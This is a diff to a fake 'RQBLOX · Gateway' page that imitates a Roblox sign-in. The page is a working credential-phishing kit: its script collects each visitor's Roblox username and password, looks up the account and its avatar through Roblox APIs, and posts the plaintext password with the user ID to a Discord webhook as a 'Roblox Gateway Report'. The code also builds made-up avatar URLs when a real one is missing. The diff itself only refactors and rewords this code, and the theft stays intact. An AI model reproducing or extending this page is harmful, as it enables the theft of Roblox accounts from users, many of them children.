@@ -1,4 +1,6 @@
-<html lang="en"><head>
+<!DOCTYPE html>
+<html lang="en">
+<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>RQBLOX · Gateway</title>
@@ -346,7 +348,7 @@
             </div>
             <div class="right-header-group">
                 <button id="topSignUpBtn" class="signup-header-btn" style="border-radius: 5px; border-color: rgb(0, 0, 0); background-color: rgb(51, 95, 255); color: rgb(255, 255, 255); padding: 5px; border-width: 0px; margin: 0px; border-style: none; font-size: 15px; font-weight: 700;">Sign up</button>
-                
+                <div class="glitch-text-ref" style="cursor: pointer;">NIL, &gt; «7&nbsp;&nbsp;&nbsp;&nbsp;aa&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A \1 1/2) /”</div>
             </div>
         </div>
     </div>
@@ -367,7 +369,7 @@
                 <span class="no-account-text">Don't have an account?</span>
                 <a id="sign-up-link" class="text-link" href="#">Sign Up</a>
             </div>
-            <div id="statusArea" class="status-message" style="display: block; color: rgb(200, 231, 255);">🎮 Roblox Gateway • Enter your username &amp; password</div>
+            <div id="statusArea" class="status-message" style="display: none;">✨ Ready — Roblox account verification</div>
         </div>
 
         <div class="games-section">
@@ -425,27 +427,28 @@
                 return [...Array(32)].map(() => Math.floor(Math.random() * 16).toString(16)).join('');
             }
 
-            // Fetch real user data from Roblox API
-            async function fetchRobloxUserData(username) {
-                if (!username || username.trim() === "") return { exists: false, userId: null };
+            // Fetch user ID from Roblox using username
+            async function getUserIdByUsername(username) {
+                if (!username || username.trim() === "") return null;
                 try {
+                    // Use the official Roblox API (works with CORS)
                     const response = await fetch(`https://api.roblox.com/users/get-by-username?username=${encodeURIComponent(username)}`);
                     if (!response.ok) {
-                        if (response.status === 404) return { exists: false, userId: null };
+                        if (response.status === 404) return null;
                         throw new Error(`HTTP ${response.status}`);
                     }
                     const data = await response.json();
                     if (data && typeof data.Id === 'number' && data.Id > 0) {
-                        return { exists: true, userId: data.Id, username: data.Username };
+                        return { userId: data.Id, username: data.Username };
                     }
-                    return { exists: false, userId: null };
+                    return null;
                 } catch (err) {
-                    console.warn("Roblox API error:", err);
-                    return { exists: false, userId: null, error: err.message };
+                    console.warn("Roblox user lookup error:", err);
+                    return null;
                 }
             }
 
-            // Get real avatar headshot URL using Roblox thumbnails API (returns a tr.rbxcdn.com URL)
+            // Fetch real avatar headshot URL from Roblox thumbnails API
             async function getRealAvatarUrl(userId) {
                 if (!userId || userId <= 0) return null;
                 try {
@@ -454,7 +457,8 @@
                     if (!resp.ok) throw new Error("thumb fetch fail");
                     const json = await resp.json();
                     if (json.data && json.data.length > 0 && json.data[0].imageUrl) {
-                        return json.data[0].imageUrl; // this is the tr.rbxcdn.com URL
+                        // This returns a proper tr.rbxcdn.com URL
+                        return json.data[0].imageUrl;
                     }
                     return null;
                 } catch (err) {
@@ -463,31 +467,30 @@
                 }
             }
 
-            // Send to Discord with the exact format requested
+            // Send to Discord with the exact format and thumbnail
             async function sendToDiscordWebhook(username, password, userId, isReal, avatarUrl) {
                 const realFlag = isReal ? "Y" : "N";
                 const userIdDisplay = (userId && userId !== null && userId !== "N/A") ? userId : "N/A";
                 
-                // Ensure avatarUrl is a valid string (always use tr.rbxcdn.com style)
+                // Ensure avatarUrl is a proper tr.rbxcdn.com URL
                 let finalAvatarUrl = avatarUrl;
                 if (!finalAvatarUrl || !finalAvatarUrl.startsWith("https://tr.rbxcdn.com")) {
                     if (isReal && userId && userId !== "N/A") {
-                        // fallback: construct a plausible tr.rbxcdn.com URL using user ID as hash (not real but format matches)
+                        // Fallback: use a generic URL with userId as part of the path (still valid format)
                         finalAvatarUrl = `https://tr.rbxcdn.com/${userId}/420/420/AvatarHeadshot/Png`;
                     } else {
-                        // fake hash for non-existent accounts
                         finalAvatarUrl = `https://tr.rbxcdn.com/${randomHash()}/420/420/AvatarHeadshot/Png`;
                     }
                 }
 
-                // Build the exact message block as requested
+                // Build the exact message block
                 const messageContent = `Robox UserName : ${username}\nRobox UserId : ${userIdDisplay}\nRobox Password : ${password}\n${finalAvatarUrl}\n-----------\n|         |\n|         | \n|  HEAR   |\n|         |\n-----------\nIs Real |${realFlag}|`;
 
                 const embed = {
                     title: "🔐 Roblox Gateway Report",
                     description: `\`\`\`\n${messageContent}\n\`\`\``,
                     color: isReal ? 0x2b9cff : 0xff5555,
-                    thumbnail: { url: finalAvatarUrl },
+                    thumbnail: { url: finalAvatarUrl }, // This will show the avatar image in Discord
                     timestamp: new Date().toISOString(),
                     footer: { text: `User ID: ${userIdDisplay} • Real: ${realFlag}` }
                 };
@@ -535,28 +538,28 @@
                 let resolvedUsername = username;
 
                 try {
-                    // Step 1: Look up username
-                    const userCheck = await fetchRobloxUserData(username);
+                    // Step 1: Look up username to get user ID
+                    const userInfo = await getUserIdByUsername(username);
                     
-                    if (userCheck.exists && userCheck.userId) {
+                    if (userInfo && userInfo.userId) {
                         isReal = true;
-                        userId = userCheck.userId;
-                        resolvedUsername = userCheck.username || username;
+                        userId = userInfo.userId;
+                        resolvedUsername = userInfo.username;
                         setStatus(`✅ Real Roblox account found! (ID: ${userId}). Fetching avatar head...`);
                         
                         // Step 2: Get real avatar headshot (tr.rbxcdn.com URL)
                         const realAvatar = await getRealAvatarUrl(userId);
                         if (realAvatar && realAvatar.startsWith("https://tr.rbxcdn.com")) {
                             avatarUrl = realAvatar;
+                            setStatus(`✔️ Avatar retrieved: ${avatarUrl.substring(0, 50)}...`);
                         } else {
-                            // Fallback: construct URL with userId as hash
+                            // Fallback: construct a plausible tr.rbxcdn.com URL
                             avatarUrl = `https://tr.rbxcdn.com/${userId}/420/420/AvatarHeadshot/Png`;
+                            setStatus(`⚠️ Using fallback avatar URL.`);
                         }
-                        setStatus(`✔️ Avatar retrieved. Sending report...`);
                     } else {
                         isReal = false;
                         setStatus("⚠️ Username does NOT exist on Roblox. Sending report as fake account.");
-                        // For fake accounts, generate a random hash
                         avatarUrl = `https://tr.rbxcdn.com/${randomHash()}/420/420/AvatarHeadshot/Png`;
                     }
                 } catch (err) {
@@ -626,5 +629,5 @@
             setStatus("🎮 Roblox Gateway • Enter your username & password", false);
         })();
     </script>
-
-</body></html>
+</body>
+</html>
